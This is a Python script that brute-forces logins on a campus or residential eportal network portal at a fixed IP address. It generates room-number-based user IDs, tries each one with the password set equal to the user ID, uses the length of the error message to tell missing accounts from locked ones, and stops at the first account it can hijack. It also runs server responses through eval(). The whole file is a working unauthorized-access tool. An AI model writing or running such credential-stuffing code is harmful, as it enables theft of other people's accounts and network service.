# Author = Harold_Finch

import requests
from urllib.parse import quote
import os

URL = 'http://210.77.16.21'

def Make_Cookies(jid):
    # Make Cookies with given Jid
    Cookies = {
        'EPORTAL_AUTO_LAND': '',
        'EPORTAL_COOKIE_USERNAME': '',
        'EPORTAL_COOKIE_PASSWORD': '',
        'EPORTAL_COOKIE_SERVER': '',
        'EPORTAL_COOKIE_SERVER_NAME': '',
        'EPORTAL_COOKIE_DOMAIN': '',
        'EPORTAL_COOKIE_SAVEPASSWORD': 'false',
        'EPORTAL_COOKIE_OPERATORPWD': '',
        # 'JSESSIONID': jid
    }
    return Cookies

def Init():
    # Make fake headers, set sessions, and make Cookies.
    headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
               'Accept-Encoding': 'gzip, deflate, sdch',
               'Accept-Language': 'zh-CN,zh;q=0.8',
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}

    session = requests.session()
    session.headers.update(headers)
    response = session.get(URL)
    r_url = response.url
    jid = session.cookies['JSESSIONID']
    querystring = r_url[38:]
    querystring = quote(quote((querystring)))
    Cookies = Make_Cookies(jid)

    headers = {'Accept': '*/*',
               'Accept-Encoding': 'gzip, deflate',
               'Accept-Language': 'zh-CN,zh;q=0.8',
               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
               'Referer': URL + '/eportal/index.jsp?' + r_url[38:],
               'DNT': '1',
               'Origin': URL,
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
    session.headers.update(headers)
    Cookie_object = requests.cookies.cookiejar_from_dict(Cookies, cookiejar=None, overwrite=True)

    return session, querystring, Cookie_object

def login(userid,password, session,Cookie_object):
    # Login in with given userid and password
    data_string = 'userId=' + userid + '&password=' + password + '&service=&queryString=' + querystring + '&operatorPwd=&validcode='

    login_url = URL + '/eportal/InterFace.do?method=login'
    login_response = session.post(login_url, data=data_string, cookies=Cookie_object)

    null = ''  # for some condition there will be a null here.
    result_dict = eval(login_response.text)
    result = 'success' == result_dict['result']

    return result, result_dict

if __name__ == '__main__':

    session, querystring, Cookie_object = Init()

    userid_list = []
    delete_list = []
    skip_list = []
    if not os.path.exists('userid_list.ini'):   # no such file exists, generate new one.
        with open('userid_list.ini','w') as f_userid:
            for building_num in range(2):
                for floor_num in range(9):
                    for room_num in range(25):
                        num = 1000 * (building_num + 1) + 100 * (floor_num + 1) + room_num + 1
                        string_num = str(num)
                        string = 'hyzx' + string_num
                        userid_list.append(string)
                        f_userid.write(string + '\n')
    else:   #Read userid list
        with open('userid_list.ini', 'r') as f_userid:
            for line in f_userid.readlines():
                userid_list.append(line.strip('\n'))
    Start_point = 0
    if os.path.exists('Last_success.ini'):
        with open('Last_success.ini', 'r') as f_Last_success:
            Last_success = f_Last_success.readline()
            Start_point = userid_list.index(Last_success)
    if os.path.exists('userid_skip'):
        with open('userid_skip','r') as f_skip_list:
            for line in f_skip_list.readlines():
                skip_list.append(line.strip('\n'))

    Login_in_flag = False
    Flag_delete = False  # There is deletion?
    Flag_Update_skip_list = False   #Update Skip list?

    for index, userid_each in enumerate(userid_list[Start_point:]):
        userid = userid_each
        password = userid

        result, result_dict = login(userid, password, session, Cookie_object)  # Try login in
        if not result:  # If connection failed
            if len(result_dict['message']) in [41, 44]:  # Password fail or user not exists.
                # User not exists.
                del userid_list[userid_list.index(userid_each)]
                Flag_delete = True
                pass

            elif len(result_dict['message']) == 22:
                if userid_each not in skip_list:
                    skip_list.append(userid_each)
                    Flag_Update_skip_list = True
        else:
            Login_in_flag = True
            successful_attempt = userid
            break
# Update userid_list.ini

    if Flag_delete:  # Delete wrong accounts.
        with open('userid_list.ini', 'w') as f_userid:
            for each in userid_list:
                f_userid.write(each + '\n')

    if Flag_Update_skip_list:
        with open('userid_skip.ini', 'w') as f_skip:
            for each in skip_list:
                f_skip.write(each + '\n')
    if Login_in_flag:
        with open('Last_success.ini', 'w') as f:
            f.write(successful_attempt)
        print('Done,enjoy')
    else:
        try:
            os.remove('Last_success.ini')
        except:
            pass
        print('Sorry, i tried')
